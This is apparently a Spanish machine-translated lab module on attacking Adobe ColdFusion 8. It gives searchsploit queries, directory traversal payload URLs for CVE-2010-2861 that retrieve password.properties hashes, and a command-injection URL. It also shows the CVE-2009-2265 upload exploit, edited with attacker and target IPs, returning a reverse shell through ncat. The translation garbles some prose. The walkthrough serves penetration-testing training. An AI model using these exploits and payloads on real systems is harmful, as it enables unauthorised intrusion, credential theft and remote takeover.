# Attacking ColdFusion

Ahora que sabemos que Coldfusion 8 es un objetivo, el siguiente paso es verificar las hazañas conocidas existentes.`Searchsploit`es una herramienta de línea de comandos para`searching and finding exploits`En la base de datos de Exploit. Es parte del proyecto de base de datos Exploit, una organización sin fines de lucro que proporciona un repositorio público de exploits y software vulnerable.`Searchsploit`Búsqueda a través de la base de datos Exploit y devuelve una lista de exploits y sus detalles relevantes, incluido el nombre de la exploit, su descripción y la fecha en que se lanzó.

### **SearchSploit**

Atacando a Coldfusion

```
xnoxos@htb[/htb]$ searchsploit adobe coldfusion------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

Como sabemos, la versión de ColdFusion Running es`ColdFusion 8`, y hay dos resultados de interés. El`Adobe ColdFusion - Directory Traversal`y el`Adobe ColdFusion 8 - Remote Command Execution (RCE)`resultados.

---

# **Recorrido por el directorio**

`Directory/Path Traversal`es un ataque que permite a un atacante acceder a archivos y directorios fuera del directorio previsto en una aplicación web. El ataque explota la falta de validación de entrada en una aplicación web y se puede ejecutar a través de varios`input fields`como`URL parameters`, `form fields`, `cookies`, y más. Al manipular los parámetros de entrada, el atacante puede atravesar la estructura del directorio de la aplicación web y`access sensitive files`, incluido`configuration files`, `user data`y otros archivos del sistema. El ataque se puede ejecutar manipulando los parámetros de entrada en etiquetas Coldfusion como`CFFile`y`CFDIRECTORY,`que se utilizan para operaciones de archivos y directorio, como cargar, descargar y listar archivos.

Tome el siguiente fragmento de código de fría de ColdFusion:

Código:html

```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList"><cfloop query="fileList"><a href="uploads/#fileList.name#">#fileList.name#</a><br></cfloop>
```

En este fragmento de código, el Coldfusion`cfdirectory`La etiqueta enumera el contenido del`uploads`directorio y el`cfloop`La etiqueta se usa para recorrer los resultados de la consulta y mostrar los nombres de archivo como enlaces en HTML.

Sin embargo, el`directory`El parámetro no se valida correctamente, lo que hace que la aplicación sea vulnerable a un ataque transversal de ruta. Un atacante puede explotar esta vulnerabilidad manipulando el`directory`parámetro para acceder a archivos fuera del`uploads`directorio.

Código:http

```
http://example.com/index.cfm?directory=../../../etc/&file=passwd

```

En este ejemplo, el`../`La secuencia se utiliza para navegar por el árbol de directorio y acceder al`/etc/passwd`Archivo fuera de la ubicación prevista.

`CVE-2010-2861`es el`Adobe ColdFusion - Directory Traversal`exploit descubierto por`searchsploit`. Es una vulnerabilidad en Coldfusion que permite a los atacantes realizar ataques transversales de ruta.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

Estos archivos de ColdFusion son vulnerables a un ataque de recorrido de directorio en`Adobe ColdFusion 9.0.1`y`earlier versions`. Los atacantes remotos pueden explotar esta vulnerabilidad para leer archivos arbitrarios manipulando el`locale parameter`En estos archivos específicos de ColdFusion.

Con esta vulnerabilidad, los atacantes pueden acceder a archivos fuera del directorio previsto al incluir`../`secuencias en el parámetro del archivo. Por ejemplo, considere la siguiente URL:

Código:http

```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en

```

En este ejemplo, la URL intenta acceder al`mappings.cfm`archivo en el`/CFIDE/administrator/settings/`directorio de la aplicación web con una especificación`en`lugar. Sin embargo, se puede ejecutar un ataque transversal del directorio manipulando el parámetro local de la URL, lo que permite a un atacante leer archivos arbitrarios ubicados fuera del directorio previsto, como archivos de configuración o archivos del sistema.

Código:http

```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

```

En este ejemplo, el`../`Se han utilizado secuencias para reemplazar un`locale`para atravesar la estructura del directorio y acceder al`passwd`archivo ubicado en el`/etc/`directorio.

Usando`searchsploit`, copie el exploit a un directorio de trabajo y luego ejecute el archivo para ver qué argumentos requiere.

Atacando a Coldfusion

```
xnoxos@htb[/htb]$ searchsploit -p 14641  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID#14641's path to the clipboard

```

### **Coldfusion - Explotación**

Atacando a Coldfusion

```
xnoxos@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .xnoxos@htb[/htb]$ python2 14641.py usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed

```

El`password.properties`Archivo en ColdFusion es un archivo de configuración que almacena de forma segura encriptadas contraseñas para varios servicios y recursos que utiliza ColdFusion Server. Contiene una lista de pares de valor clave, donde la clave representa el nombre del recurso y el valor es la contraseña cifrada. Estas contraseñas encriptadas se utilizan para servicios como`database connections`, `mail servers`, `LDAP servers`y otros recursos que requieren autenticación. Al almacenar contraseñas cifradas en este archivo, ColdFusion puede recuperarlas automáticamente y usarlas para autenticarse con los servicios respectivos sin requerir la entrada manual de contraseñas cada vez. El archivo generalmente está en el`[cf_root]/lib`directorio y se puede gestionar a través del administrador de ColdFusion.

Al proporcionar los parámetros correctos al script de exploit y especificar la ruta del archivo deseado, el script puede activar un exploit en los puntos finales vulnerables mencionados anteriormente. Luego, el script generará el resultado del intento de exploit:

### **Coldfusion - Explotación**

Atacando a Coldfusion

```
xnoxos@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \npassword=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...

```

Como podemos ver, el contenido del`password.properties`Se han recuperado el archivo, lo que demuestra que este objetivo es vulnerable a`CVE-2010-2861`.

---

# **RCE no autenticado**

Ejecución de código remoto no autenticado (`RCE`) es un tipo de vulnerabilidad de seguridad que permite que un atacante`execute arbitrary code`en un sistema vulnerable`without requiring authentication`. Este tipo de vulnerabilidad puede tener graves consecuencias, como lo hará`enable an attacker to take complete control of the system`y potencialmente robar datos confidenciales o causar daños al sistema.

La diferencia entre un`RCE`y un`Unauthenticated Remote Code Execution`es si un atacante necesita o no proporcionar credenciales de autenticación válidas para explotar la vulnerabilidad. Una vulnerabilidad de RCE permite que un atacante ejecute código arbitrario en un sistema de destino, independientemente de si tienen o no credenciales válidas. Sin embargo, en muchos casos, las vulnerabilidades de RCE requieren que el atacante ya tenga acceso a alguna parte del sistema, ya sea a través de una cuenta de usuario u otros medios.

Por el contrario, una vulnerabilidad de RCE no autenticada permite que un atacante ejecute código arbitrario en un sistema de destino sin ninguna credencial de autenticación válida. Esto hace que este tipo de vulnerabilidad sea particularmente peligroso, ya que un atacante puede hacerse cargo de un sistema o ejecutar comandos maliciosos sin ninguna barrera de entrada.

En el contexto de las aplicaciones web de ColdFusion, un ataque RCE no autenticado ocurre cuando un atacante puede ejecutar código arbitrario en el servidor sin requerir ninguna autenticación. Esto puede suceder cuando una aplicación web permite la ejecución del código arbitrario a través de una característica o función que no requiere autenticación, como una consola de depuración o una funcionalidad de carga de archivos. Tome el siguiente código:

Código:html

```html
<cfset cmd = "#cgi.query_string#"><cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

En el código anterior, el`cmd`La variable se crea concatenando el`cgi.query_string`variable con un comando a ejecutar. Este comando se ejecuta luego usando el`cfexecute`función, que ejecuta las ventanas`cmd.exe`programa con los argumentos especificados. Este código es vulnerable a un ataque RCE no autenticado porque no valida adecuadamente el`cmd`variable antes de ejecutarlo, ni requiere que el usuario sea autenticado. Un atacante simplemente podría pasar un comando malicioso como el`cgi.query_string`variable, y sería ejecutado por el servidor.

Código:http

```
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt

```

Esta URL incluye un punto y coma (`%3B`) al comienzo de la cadena de consulta, que puede permitir la ejecución de múltiples comandos en el servidor. Esto podría agregar una funcionalidad legítima con un comando no deseado. El incluido`echo`El comando imprime un mensaje en la consola, y es seguido por un comando de redirección para escribir un archivo al`C:`Directorio con un mensaje que indica que el servidor se ha visto comprometido.

Un ejemplo de un ataque de RCE no autenticado en Coldfusion es el`CVE-2009-2265`Vulnerabilidad que afectó las versiones de Adobe Coldfusion 8.0.1 y antes. Esta exploit permitió a los usuarios no autorenticados cargar archivos y obtener la ejecución del código remoto en el host de destino. La vulnerabilidad existe en el paquete FCKEditor y es accesible en la siguiente ruta:

Código:http

```
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=

```

`CVE-2009-2265`es la vulnerabilidad identificada por nuestra búsqueda de SearchSPLOIT anterior como`Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Llévelo a un directorio de trabajo.

### **SearchSploit**

Atacando a Coldfusion

```
xnoxos@htb[/htb]$ searchsploit -p 50057  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID#50057's path to the clipboard

```

Atacando a Coldfusion

```
xnoxos@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Un rápido`cat`La revisión del código indica que el script necesita alguna información. Establezca la información correcta y inicie el exploit.

### **Modificación de explotación**

Código:pitón

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex

```

El exploit tomará un poco de tiempo en su lanzamiento, pero eventualmente devolverá un shell remoto funcional

### **Explotación**

Atacando a Coldfusion

```
xnoxos@htb[/htb]$ python3 50057.py Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--

Sending request and printing response...

		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
		</script>

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.

```

### **Caparazón**

Atacando a Coldfusion

```
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..
18/03/2008  11:11 ��            64.512 java2wsdl.exe
19/01/2008  09:59 ��         2.629.632 jikes.exe
18/03/2008  11:11 ��            64.512 jrun.exe
18/03/2008  11:11 ��            71.680 jrunsvc.exe
18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
18/03/2008  11:11 ��            64.512 jspc.exe
22/03/2017  08:53 ��             1.804 jvm.config
18/03/2008  11:11 ��            64.512 migrate.exe
18/03/2008  11:11 ��            34.816 portscan.dll
18/03/2008  11:11 ��            64.512 sniffer.exe
18/03/2008  11:11 ��            78.848 WindowsLogin.dll
18/03/2008  11:11 ��            64.512 wsconfig.exe
22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
18/03/2008  11:11 ��            64.512 wsdl2java.exe
18/03/2008  11:11 ��            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.776.704 bytes free
```